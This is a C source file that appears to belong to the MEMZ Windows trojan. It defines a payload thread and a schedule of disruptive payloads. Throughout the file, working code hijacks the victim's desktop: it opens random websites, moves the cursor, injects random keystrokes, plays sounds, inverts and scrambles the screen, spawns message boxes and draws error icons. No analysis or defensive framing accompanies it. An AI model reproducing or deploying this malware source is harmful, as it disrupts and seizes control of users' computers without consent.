#include "MEMZ.h"

// Payload-Host
DWORD WINAPI PayloadThread(LPVOID lpParameter) {
	int Delay = 0;
	int Times = 0;
	int Runtime = 0;

	PAYLOAD *Payload = (PAYLOAD*)lpParameter;

	for (;;) {
		if (Delay-- == 0) {
			Delay = (Payload->PayloadFunction)(Times++, Runtime);
		}

		Runtime++;

		Sleep(10);
	}
}

// Payload-Schedule
PAYLOAD Payloads[] = {
{ PayloadExecute, 30000 },
{ PayloadCursor, 30000 },
{ PayloadKeyboard, 20000 },
{ PayloadSound, 50000 },
{ PayloadBlink, 30000 },
{ PayloadMessageBox, 20000 },
{ PayloadDrawErrors, 10000 },
{ PayloadChangeText, 40000 },
{ PayloadPIP, 60000 },
{ PayloadPuzzle, 15000 }
};
const size_t nPayloads = sizeof(Payloads) / sizeof(PAYLOAD);

int PayloadExecute(PAYLOADFUNC) {
	ShellExecute(NULL, L"open", Sites[Random() % nSites], NULL, NULL, SW_SHOWDEFAULT);

	return 1500.0 / (Times / 15.0 + 1) + 100 + (Random() % 200);
}

int PayloadCursor(PAYLOADFUNC) {
	POINT Cursor;
	GetCursorPos(&Cursor);

	SetCursorPos(Cursor.x + (Random() % 3 - 1) * (Random() % (Runtime / 2200 + 2)), Cursor.y + (Random() % 3 - 1) * (Random() % (Runtime / 2200 + 2)));

	return 2;
}

int PayloadKeyboard(PAYLOADFUNC) {
	INPUT Input;

	Input.type = INPUT_KEYBOARD;
	Input.ki.wVk = (Random() % (0x5a - 0x30)) + 0x30;
	SendInput(1, &Input, sizeof(INPUT));

	return 300 + (Random() % 400);
}

int PayloadSound(PAYLOADFUNC) {
	PlaySound(Sounds[Random() % nSounds], GetModuleHandle(NULL), SND_ASYNC);
	return 20 + (Random() % 20);
}

int PayloadBlink(PAYLOADFUNC) {
	HWND hWnd = GetDesktopWindow();
	HDC hDc = GetWindowDC(hWnd);
	RECT rEkt;
	GetWindowRect(hWnd, &rEkt);
	BitBlt(hDc, 0, 0, rEkt.right - rEkt.left, rEkt.bottom - rEkt.top, hDc, 0, 0, NOTSRCCOPY);
	ReleaseDC(hWnd, hDc);

	return 100;
}

int PayloadMessageBox(PAYLOADFUNC) {
	CreateThread(NULL, 4096, &MessageBoxThread, NULL, NULL, NULL);

	return 2000.0 / (Times / 8.0 + 1) + 20 + (Random() % 30);
}

int PayloadDrawErrors(PAYLOADFUNC) {
	int ix = GetSystemMetrics(SM_CXICON) / 2;
	int iy = GetSystemMetrics(SM_CYICON) / 2;

	HWND hWnd = GetDesktopWindow();
	HDC hDc = GetWindowDC(hWnd);

	POINT Cursor;
	GetCursorPos(&Cursor);

	DrawIcon(hDc, Cursor.x - ix, Cursor.y - iy, LoadIcon(NULL, IDI_ERROR));

	if (Random() % (int)(10 / (Times / 500.0 + 1) + 1) == 0) {
		DrawIcon(hDc, Random() % scrw, Random() % scrh, LoadIcon(NULL, IDI_WARNING));
	}

	ReleaseDC(hWnd, hDc);

	return 2;
}

int PayloadChangeText(PAYLOADFUNC) {
	EnumChildWindows(GetDesktopWindow(), &EnumChildProc, NULL);

	return 50;
}

int PayloadPIP(PAYLOADFUNC) {
	HWND hWnd = GetDesktopWindow();
	HDC hDc = GetWindowDC(hWnd);
	RECT rEkt;
	GetWindowRect(hWnd, &rEkt);
	StretchBlt(hDc, 50, 50, rEkt.right - 100, rEkt.bottom - 100, hDc, 0, 0, rEkt.right, rEkt.bottom, SRCCOPY);
	ReleaseDC(hWnd, hDc);

	return 200.0 / (Times / 5.0 + 1) + 4;
}

int PayloadPuzzle(PAYLOADFUNC) {
	HWND hWnd = GetDesktopWindow();
	HDC hDc = GetWindowDC(hWnd);
	RECT rEkt;
	GetWindowRect(hWnd, &rEkt);

	int x1 = Random() % (rEkt.right - 100);
	int y1 = Random() % (rEkt.bottom - 100);
	int x2 = Random() % (rEkt.right - 100);
	int y2 = Random() % (rEkt.bottom - 100);
	int Width = Random() % 600;
	int Height = Random() % 600;

	BitBlt(hDc, x1, y1, Width, Height, hDc, x2, y2, SRCCOPY);
	ReleaseDC(hWnd, hDc);

	return 200.0 / (Times / 5.0 + 1) + 3;
}